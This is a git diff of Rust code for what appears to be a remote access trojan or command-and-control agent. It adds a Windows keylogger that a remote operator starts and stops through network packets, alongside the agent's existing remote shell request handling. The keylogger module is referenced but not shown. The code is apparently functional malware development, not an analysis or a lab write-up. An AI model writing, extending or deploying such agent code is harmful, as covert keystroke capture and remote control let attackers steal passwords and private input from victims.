@@ -10,8 +10,8 @@ use shared::{
     error::NetworkError,
     multiplexing::{MIN_DATA_STREAM_ID, StreamId},
     packets::{
-        AgentInstruction, Packet, Packets, ShellRequest, StreamClose, StreamData, StreamOpen,
-        from_packet_bytes,
+        AgentInstruction, KeyloggerAction, Packet, Packets, ShellRequest,
+        StreamClose, StreamData, StreamOpen, from_packet_bytes,
     },
 };
 
@@ -28,6 +28,8 @@ pub struct MultiplexManager {
     incoming_streams_tx: channel::Sender<Stream>,
     incoming_streams_rx: Arc<Mutex<channel::Receiver<Stream>>>,
     shutdown: Arc<AtomicBool>,
+    #[cfg(target_os = "windows")]
+    keylogger_session: Arc<Mutex<Option<crate::keylogger::KeyloggerSession>>>,
 }
 
 impl MultiplexManager {
@@ -45,6 +47,8 @@ impl MultiplexManager {
             incoming_streams_tx: incoming_tx,
             incoming_streams_rx: Arc::new(Mutex::new(incoming_rx)),
             shutdown: Arc::new(AtomicBool::new(false)),
+            #[cfg(target_os = "windows")]
+            keylogger_session: Arc::new(Mutex::new(None)),
         }
     }
 
@@ -223,6 +227,51 @@ impl MultiplexManager {
         Ok(())
     }
 
+    #[allow(clippy::unused_self, clippy::unnecessary_wraps)]
+    fn handle_keylogger_request(
+        self: &Arc<Self>,
+        req: &shared::packets::KeyloggerRequest,
+    ) -> Result<(), NetworkError> {
+        match req.action {
+            KeyloggerAction::Start => {
+                #[cfg(target_os = "windows")]
+                {
+                    let mut session_guard =
+                        self.keylogger_session.lock().map_err(|_| NetworkError::LockError)?;
+                    if session_guard.is_some() {
+                        eprintln!("Keylogger already running");
+                        return Ok(());
+                    }
+                    let session = crate::keylogger::KeyloggerSession::start(self.clone())?;
+                    *session_guard = Some(session);
+                    eprintln!("Keylogger started");
+                }
+                #[cfg(not(target_os = "windows"))]
+                {
+                    eprintln!("Keylogger not supported on this platform");
+                }
+            }
+            KeyloggerAction::Stop => {
+                #[cfg(target_os = "windows")]
+                {
+                    let mut session_guard =
+                        self.keylogger_session.lock().map_err(|_| NetworkError::LockError)?;
+                    if let Some(mut session) = session_guard.take() {
+                        session.stop();
+                        eprintln!("Keylogger stopped");
+                    } else {
+                        eprintln!("No keylogger session to stop");
+                    }
+                }
+                #[cfg(not(target_os = "windows"))]
+                {
+                    eprintln!("Keylogger not supported on this platform");
+                }
+            }
+        }
+        Ok(())
+    }
+
     pub fn start(self: &Arc<Self>) -> thread::JoinHandle<()> {
         let self_clone = self.clone();
         thread::spawn(move || {
@@ -335,6 +384,9 @@ impl MultiplexManager {
                 }
                 Packets::ShellRequest(shell_req) => {
                     self.handle_shell_request(&shell_req)?;
+                }
+                Packets::KeyloggerRequest(req) => {
+                    self.handle_keylogger_request(&req)?;
                 }
                 _ => {
                     eprintln!("Unexpected packet in multiplex receive loop");
